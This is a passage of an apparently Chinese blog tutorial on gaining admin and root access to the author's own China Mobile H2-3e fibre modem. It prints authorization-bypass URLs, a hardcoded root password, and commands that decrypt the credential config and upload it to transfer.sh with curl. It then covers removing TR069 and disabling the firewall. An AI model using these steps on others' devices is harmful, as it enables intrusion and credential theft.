<p>\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6e29\u5ea6\u200b\u548c\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u7b49\u200b\u57fa\u672c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u5c11\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u300c\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u300d\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u540e\u9762\u200b\u624b\u52a8\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u6211\u4eec\u200b\u7684\u200b\u5149\u732b\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u3002\u200b\u4e0b\u9762\u200b\u770b\u770b\u200b\u6ca1\u6709\u200b\u5220\u200b\u4e4b\u524d\u200b\u662f\u200b\u5565\u6837\u5b50\u200b\u7684\u200b\uff1a</p> <p> </p> <p></p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u7684\u200b\u4f7f\u7528\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a5\u53e3\u200b\u7684\u200b\u8fde\u63a5\u200b\u4fe1\u606f\u200b\u7b49\u200b\u3002\u200b\u786c\u4ef6\u200b\u578b\u53f7\u200b\u4e3a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e\uff0c\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b HWVer-A911</p> <p></p> <p></p> <p></p> <p> </p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"12/5/#_5","title":"\u7b80\u5355\u200b\u603b\u7ed3","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u666e\u901a\u7528\u6237\u200b\u8fdb\u53bb\u200b\u57fa\u672c\u4e0a\u200b\u5565\u200b\u4e5f\u200b\u5e72\u4e0d\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u524d\u7aef\u200b\u9875\u9762\u200b\u7ed9\u200b\u4eba\u200b\u4e00\u79cd\u200b\u534a\u6210\u54c1\u200b\u7684\u200b\u611f\u89c9\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f88\u591a\u200b\u8fdb\u9636\u200b\u64cd\u4f5c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u80af\u5b9a\u200b\u662f\u200b\u6ca1\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8d85\u7ba1\u200b\uff08CMCCAdmin\uff09\u200b\u7684\u200b\u8eab\u4efd\u200b\u8fdb\u200b\u540e\u53f0\u200b\u624d\u200b\u53ef\u4ee5\u200b\u3002</p>"},{"location":"12/5/#_6","title":"\u8d85\u7ba1\u200b\u6743\u9650","text":""},{"location":"12/5/#_7","title":"\u8d8a\u6743\u200b\u8bbf\u95ee","text":"<p>\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u8fd9\u4e2a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e \u200b\u5149\u732b\u200b\u7684\u200b Web \u200b\u7cfb\u7edf\u200b\u5199\u200b\u7684\u200b\u5f88\u200b\u5783\u573e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b\u754c\u9762\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8d8a\u6743\u200b\u8bbf\u95ee\u200b\u5230\u200b CMCCAdmin \u200b\u7684\u200b\u7ba1\u7406\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/start.ghtml</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5427\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u529f\u80fd\u200b\u6211\u4eec\u200b\u662f\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff08\u200b\u6865\u63a5\u200b\u529f\u80fd\u200b\u3001\u200b\u9632\u706b\u5899\u200b\u5173\u95ed\u200b\u7b49\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5149\u660e\u6b63\u5927\u200b\u7684\u200b\u62ff\u5230\u200b\u771f\u6b63\u200b\u7684\u200b CMCCAdmin \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u6765\u200b\u767b\u5f55\u200b\u64cd\u4f5c\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u624d\u884c\u200b\u3002</p>"},{"location":"12/5/#telnet","title":"\u5f00\u542f\u200b Telnet","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u5149\u200b\u732b\u200b\u662f\u200b\u6ca1\u6709\u200b\u5f00\u542f\u200b Telnet 23 \u200b\u7aef\u53e3\u200b\u7684\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u548c\u200b\u5149\u732b\u200b shell \u200b\u4ea4\u4e92\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd8\u662f\u200b\u9274\u6743\u200b\u4e0d\u5f53\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b URL \u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u5230\u200b Telnet \u200b\u7684\u200b\u914d\u7f6e\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/getpage.gch?pid=1002&amp;nextpage=tele_sec_tserver_t.gch</p> <p>\u200b\u7136\u540e\u200b\u5f00\u542f\u200b Telnet\uff0c\u200b\u8bbe\u7f6e\u200b\u597d\u200b Telnet \u200b\u7684\u200b\u7528\u6237\u540d\u200b  CMCCAdmin \u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u52fe\u9009\u200b WAN \u200b\u548c\u200b LAN \u200b\u4fa7\u200b\u8bbf\u95ee\u200b\uff08\u200b\u4fdd\u5b58\u200b \u200b\u591a\u200b\u64cd\u4f5c\u200b\u51e0\u6b21\u200b\u5c31\u884c\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u5728\u200b\u770b\u770b\u200b\u5149\u732b\u200b\u7684\u200b\u7aef\u53e3\u200b\u5f00\u653e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b 23 \u200b\u7aef\u53e3\u200b\u6b63\u5e38\u200b\u5f00\u653e\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"12/5/#root","title":"\u83b7\u53d6\u200b root \u200b\u6743\u9650","text":"<p>\u200b\u56e0\u4e3a\u200b\u5386\u53f2\u200b\u9057\u7559\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u7684\u200b\u4ee3\u7801\u200b\u5199\u200b\u7684\u200b\u592a\u70c2\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u9ad8\u200b\u6743\u9650\u200b\u7684\u200b\u5bc6\u7801\u200b\u751a\u81f3\u200b\u76f4\u63a5\u200b\u786c\u200b\u7f16\u7801\u200b\u5230\u200b\u4ee3\u7801\u200b\u91cc\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0cTelnet \u200b\u4e0b\u200b su \u200b\u5207\u6362\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5bc6\u7801\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff1a  aDm8H%MdA \u200b\u767b\u5f55\u200b</p> <p> </p>"},{"location":"12/5/#_8","title":"\u83b7\u53d6\u200b\u8d85\u7ba1\u200b\u5bc6\u7801","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u4ed6\u200b\u7684\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u597d\u200b\u5728\u200b\u6211\u4eec\u200b\u5728\u200b root \u200b\u7684\u200b shell \u200b\u4ea4\u4e92\u6027\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u89e3\u5bc6\u200b\u51fa\u8d85\u200b\u7ba1\u200b\u7684\u200b\u5bc6\u7801\u200b\uff1a</p> Bash<pre><code># \u200b\u89e3\u5bc6\u200b db_user_cfg.xml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml\n\n# \u200b\u5c06\u200b\u89e3\u5bc6\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5230\u200b transfer.sh\ncurl -v -k --upload-file /tmp/debug-decry-cfg  https://transfer.sh/debug.xml\n</code></pre> <p>transfer.sh \u200b\u662f\u200b\u7b2c\u4e09\u65b9\u200b\u8fd0\u8d39\u200b\u5546\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6cc4\u9732\u200b\u5206\u4eab\u200b\uff0c\u200b\u5982\u679c\u200b\u62c5\u5fc3\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u81ea\u5df1\u200b\u672c\u5730\u200b\u67e5\u770b\u200b\u5373\u53ef\u200b\u3002\u200b\u56fd\u5149\u200b\u6211\u200b\u4e2a\u4eba\u200b\u5efa\u8bae\u200b\u5907\u4efd\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u4eec\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u5c31\u200b\u56de\u4e0d\u6765\u200b\u4e86\u200b\u3002</p> <p>curl \u200b\u4e0a\u4f20\u200b\u6210\u529f\u200b\u6216\u200b\u56de\u200b\u8fd4\u56de\u200b\u968f\u673a\u200b\u8def\u5f84\u200b\u7684\u200b URL\uff1a</p> <p> </p> <p>\u200b\u8bbf\u95ee\u200b\u5373\u53ef\u200b\u4e0b\u8f7d\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u770b\u770b\u200b\u8fd9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u91cc\u9762\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u3002</p> <ul> <li>\u200b\u5149\u732b\u200b\u7684\u200b\u8d85\u7ba1\u200b\u548c\u200b\u666e\u901a\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4fe1\u606f\u200b\uff1a</li> </ul> <p> </p> <ul> <li>\u200b\u4fdd\u5b58\u200b\u7684\u200b PPPoE \u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u56de\u5230\u200b\u4e4b\u524d\u200b\u7684\u200b http://192.168.1.1/ \u200b\u9875\u9762\u200b\uff0c\u200b\u6211\u4eec\u200b\u91cd\u65b0\u200b\u4f7f\u7528\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b CMCCAdmin \u200b\u7684\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"12/5/#_9","title":"\u5149\u732b\u200b\u8c03\u6559","text":""},{"location":"12/5/#tr069","title":"\u5220\u9664\u200b TR069","text":"<p>\u200b\u56e0\u4e3a\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u662f\u200b\u901a\u8fc7\u200b TR069 \u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u505a\u200b\u4e00\u4e9b\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5220\u6389\u200b\u5b83\u200b\uff0c\u200b\u4e00\u52b3\u6c38\u9038\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4e00\u76f4\u200b\u662f\u200b\u6211\u4eec\u200b\u89e3\u5bc6\u200b\u51fa\u6765\u200b\u7684\u200b\u6837\u5b50\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u4e0d\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b TR069 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6709\u200b\u5176\u4ed6\u200b\u5947\u6280\u6deb\u5de7\u200b\u7684\u200b\u73a9\u6cd5\u200b\uff1aTR069 \u200b\u5185\u200b\u7f51\u200b\u96a7\u9053\u200b\u3001\u200b\u5f02\u5730\u200b\u7ec4\u7f51\u200b\u3001\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\uff1f   \u200b\u53ef\u60dc\u200b\u56fd\u5149\u200b\u660e\u5929\u200b\u8981\u200b\u4e0a\u73ed\u200b\u4e86\u200b\uff0c\u200b\u7cbe\u529b\u200b\u4e0d\u591f\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u200b\u4e86\u200b\uff0cmark \u200b\u4e00\u4e0b\u200b\u540e\u9762\u200b\u6709\u200b\u673a\u4f1a\u200b\u6298\u817e\u200b\u8fd9\u4e2a\u200b\u3002</p>"},{"location":"12/5/#upnp","title":"\u542f\u7528\u200b UPnP","text":"<p>\u200b\u5f00\u542f\u200b UPnP \u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u529f\u80fd\u200b\uff0cUPnP \u200b\u6216\u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u662f\u200b\u4e00\u79cd\u200b\u534f\u8bae\u200b\u96c6\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u6e38\u620f\u200b\uff09\u200b\u81ea\u52a8\u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6781\u5927\u200b\u7684\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u867d\u7136\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5927\u5185\u200b\u7f51\u200b\uff0c\u200b\u4f46\u662f\u200b\u6539\u5584\u200b\u4e00\u70b9\u200b\u662f\u200b\u4e00\u70b9\u200b\u5427\u200b\uff1a</p> <p> </p>"},{"location":"12/5/#qos","title":"\u5173\u95ed\u200b QoS","text":"<p>\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u200b\u5e26\u5bbd\u200b\u8fdb\u884c\u200b\u9650\u901f\u200b\uff0c\u200b\u800c\u4e14\u200b\u6211\u4eec\u200b\u4e0a\u7f51\u200b\u7684\u200b INTERNET \u200b\u4e1a\u52a1\u200b\u4f18\u5148\u7ea7\u200b\u8fd8\u662f\u200b\u6700\u4f4e\u200b\uff1f\u200b\u8fd9\u200b\u4e0d\u80fd\u200b\u5fcd\u200b\uff01\u200b\u76f4\u63a5\u200b\u5173\u6389\u200b QoS \u200b\u5373\u53ef\u200b\uff0c\u200b\u975e\u5e38\u200b\u7701\u200b\u4e8b\u513f\u200b\uff1a</p> <p> </p>"},{"location":"12/5/#_10","title":"\u9632\u706b\u5899\u200b\u914d\u7f6e","text":"<p>\u200b\u9996\u5148\u200b\u53d6\u6d88\u200b\u6240\u6709\u200b\u5b89\u5168\u200b\u9632\u62a4\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5c06\u200b\u9632\u706b\u5899\u200b\u7b49\u7ea7\u200b\u8c03\u5230\u200b\u4f4e\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u5728\u200b\u732b\u200b\u4e0b\u9762\u200b\u7684\u200b\u673a\u5668\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u83b7\u53d6\u200b\u5230\u200b IPv6 \u200b\u516c\u7f51\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b Python \u200b\u542f\u52a8\u200b\u4e2a\u200b  Web \u200b\u670d\u52a1\u200b\u9a8c\u8bc1\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code>python3 -m http.server --bind ::\n</code></pre> <p>\u200b\u624b\u673a\u200b\u4f7f\u7528\u200b SIM \u200b\u8fd0\u8425\u5546\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6210\u529f\u200b\u8bbf\u95ee\u200b\uff1a</p> <p> </p>"},{"location":"12/5/#_11","title":"\u5149\u732b\u200b\u6865\u63a5","text":"<p>\u200b\u5176\u5b9e\u200b\u5982\u679c\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e4b\u524d\u200b\u7684\u200b\u300c\u200b\u5149\u732b\u200b\u8c03\u6559\u200b\u300d\u200b\u90e8\u5206\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u65e0\u6240\u8c13\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u4e86\u200b\u3002\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u200b\u597d\u5904\u200b\uff1a</p> <ol> <li>\u200b\u6539\u5584\u200b NAT \u200b\u7c7b\u578b\u200b\uff08\u200b\u4e2d\u56fd\u7535\u4fe1\u200b\u6709\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u83b7\u53d6\u200b\u516c\u7f51\u200b IPv4\uff09</li> <li>\u200b\u63d0\u9ad8\u200b\u7f51\u7edc\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u51cf\u8f7b\u200b\u5149\u732b\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u538b\u529b\u200b\u8f6c\u79fb\u200b\u5230\u200b\u4e86\u200b\u8def\u7531\u5668\u200b</li> <li>\u200b\u65b9\u4fbf\u200b\u7528\u6237\u200b\u81ea\u5b9a\u4e49\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u7684\u200b\u5b98\u65b9\u200b\u9650\u5236\u200b\u6709\u70b9\u200b\u591a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4ea4\u7ed9\u200b\u8def\u7531\u5668\u200b\u7684\u8bdd\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u7075\u6d3b\u200b\u914d\u7f6e\u200b</li> </ol> <p>\u200b\u800c\u4e14\u200b\u636e\u8bf4\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u90a3\u200b\u4e0d\u200b\u5c31\u200b\u7f8e\u6ecb\u6ecb\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u51c6\u5907\u200b\u5f00\u59cb\u200b\u6865\u63a5\u200b\u3002</p>"},{"location":"12/5/#_12","title":"\u8bb0\u5f55\u200b\u914d\u7f6e","text":"<p>\u200b\u56e0\u4e3a\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u5df2\u6709\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e3a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u5220\u6389\u200b\u73b0\u6709\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7136\u540e\u200b\u65b0\u5efa\u200b1\u200b\u4e2a\u200b\u8fde\u63a5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u4e4b\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u91cd\u70b9\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b VLAN \u200b\u6a21\u5f0f\u200b\u548c\u200b ID\uff1a</p> <p> </p>"},{"location":"12/5/#_13","title":"\u65b0\u5efa\u200b\u8fde\u63a5","text":"<p>\u200b\u65b0\u5efa\u200b 1 \u200b\u4e2a\u200b WAN \u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e3b\u8981\u200b\u914d\u7f6e\u200b\u6284\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7684\u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u7684\u200b\u914d\u7f6e\u200b\u8be6\u60c5\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6c5f\u82cf\u200b\u79fb\u52a8\u200b\u6700\u5927\u200b\u652f\u6301\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u6b63\u597d\u200b\u4e5f\u200b\u6709\u200b 4 \u200b\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u52fe\u9009\u200b\u8fd9\u200b\u51e0\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u5177\u4f53\u200b\u914d\u7f6e\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u786e\u4fdd\u200b\u5220\u6389\u200b\u4e4b\u524d\u200b\u7684\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53ea\u6709\u200b 1 \u200b\u4e2a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u751f\u6548\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\u5149\u732b\u200b\u3002  </p>"},{"location":"12/5/#_14","title":"\u62e8\u53f7\u4e0a\u7f51","text":"<p>\u200b\u6865\u63a5\u200b\u6210\u529f\u200b\u540e\u200b\uff0cMBP \u200b\u76f4\u63a5\u200b\u7f51\u7ebf\u200b\u63d2\u5149\u200b\u732b\u200b\u4e0a\u200b\uff0c\u200b\u5373\u53ef\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u6539\u200b\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u5728\u200b\u8def\u7531\u5668\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\uff1a</p> <p> </p> <p>\u200b\u7f8e\u6ecb\u6ecb\u200b\uff0c\u200b\u5f00\u59cb\u200b\u5c3d\u60c5\u200b\u4eab\u53d7\u200b\u4f60\u200b\u7684\u200b\u7f51\u7edc\u200b\u5427\u200b~~~</p>"},{"location":"12/5/#_15","title":"\u5c0f\u200b\u4f17\u200b\u573a\u666f","text":"<p>\u200b\u80af\u5b9a\u200b\u4f1a\u200b\u6709\u200b\u7f51\u53cb\u200b\u597d\u5947\u200b\u5149\u732b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u6865\u63a5\u200b\u548c\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u5417\u200b\uff1f\u200b\u90a3\u200b\u80af\u5b9a\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u573a\u666f\u200b\u975e\u5e38\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u5199\u200b\u8fd9\u200b\u7bc7\u6587\u7ae0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f4f\u200b\u7684\u200b\u8fd8\u662f\u200b LOFT \u200b\u516c\u5bd3\u200b\uff0c\u200b\u548c\u200b\u697c\u4e0a\u200b\u7684\u200b\u5c0f\u54e5\u200b\u5171\u7528\u200b 1 \u200b\u4e2a\u5149\u200b\u732b\u200b\u3002\u200b\u6211\u200b\u5982\u679c\u200b\u6539\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u60f3\u200b\u8ba9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u65e0\u611f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5728\u200b\u5149\u732b\u200b\u4e0b\u200b\u5916\u63a5\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u7684\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u8def\u7531\u5668\u200b\u4e86\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u592a\u200b\u5f20\u626c\u200b\u548c\u200b\u4e0d\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5355\u72ec\u200b\u7ed9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5176\u4ed6\u200b\u5168\u90e8\u200b\u8d70\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u5b9e\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 2\u30013\u30014 